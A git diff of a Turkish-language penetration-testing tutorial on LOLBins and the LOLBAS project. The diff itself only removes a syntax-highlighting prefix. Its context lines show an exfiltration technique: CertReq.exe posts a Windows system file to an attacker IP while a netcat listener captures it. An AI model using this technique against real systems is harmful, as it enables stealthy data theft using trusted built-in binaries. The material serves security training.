@@ -15,7 +15,7 @@ LOLBins (Living Off The Land Binaries) terimi, bir saldırganın orijinal amacı
 
 LOLBAS (Living Off The Land Binaries, Scripts and Libraries) sitesinde indirme ve yükleme işlevlerini aramak için `/download` veya `/upload` filtrelerini kullanabiliriz.
 
-Örnek olarak [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) aracını ele alalım. Netcat aracını kullanarak gelen trafiği, saldırı makinemizdeki bir port üzerinden dinlememiz ve ardından bir dosya yüklemek için `#!batch CertReq.exe` aracını çalıştırmamız gerekiyor:
+Örnek olarak [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) aracını ele alalım. Netcat aracını kullanarak gelen trafiği, saldırı makinemizdeki bir port üzerinden dinlememiz ve ardından bir dosya yüklemek için `CertReq.exe` aracını çalıştırmamız gerekiyor:
 
 ```batch
 certreq.exe -Post -config http://192.168.49.128 c:\windows\win.ini
@@ -48,7 +48,7 @@ Host: 192.168.49.128
 MAPI=1
 ```
 
-Eğer `#!batch CertReq.exe` aracını çalıştırırken hata alırsanız kullandığınız sürüm POST parametresini içermiyor olabilir. Güncel sürümü [buradan](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) indirip tekrar deneyebilirsiniz.
+Eğer `CertReq.exe` aracını çalıştırırken hata alırsanız kullandığınız sürüm POST parametresini içermiyor olabilir. Güncel sürümü [buradan](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) indirip tekrar deneyebilirsiniz.
 
 ### GTFOBins
 
